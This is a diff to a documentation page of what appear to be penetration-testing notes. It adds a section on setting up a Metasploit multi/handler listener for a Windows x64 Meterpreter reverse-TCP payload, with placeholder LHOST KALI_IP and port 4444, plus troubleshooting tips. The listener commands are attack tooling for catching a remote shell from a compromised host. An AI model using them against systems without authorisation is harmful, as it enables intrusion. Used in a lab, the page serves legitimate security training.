@@ -7,7 +7,41 @@ boost: 10
 hideFooterPagination: true
 ---
 
+import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+
 {/* Generated from Commands/metasploit.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+
+## Current operation: Configure a matching reverse-TCP handler
+
+**Run in:** Inside msfconsole on Kali. **Requires:** A payload with the same platform, transport and callback settings; the listener address is assigned to Kali and reachable from the target.
+
+```bash
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST KALI_IP
+set LPORT 4444
+run
+```
+
+**Read the result:** Read module information, required options and check behavior, then verify the resulting session type and identity.
+
+**If A connection arrives but the expected session does not initialize:** An exploit's name or a matching banner is insufficient; target build, module prerequisites, payload compatibility and network direction matter.
+
+**Next check:** Compare staged versus stageless payload and transport settings; inspect handler messages before regenerating a payload.
+
+**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
+
+### Reviewed operation documentation
+
+- [Primary reference 1](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html)
+
+## Preserved earlier notes
+
+<PreservedNotes>
+
+Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
 
 ## msfconsole: choose the operation and read the result
 
@@ -954,3 +988,5 @@ LPORT => 8080
 - [Metasploit Framework: Startup to Sessions](/exploitation/metasploit-framework-cheat-sheet)
 
 {/* VAULT_RELATED_END */}
+
+</PreservedNotes>
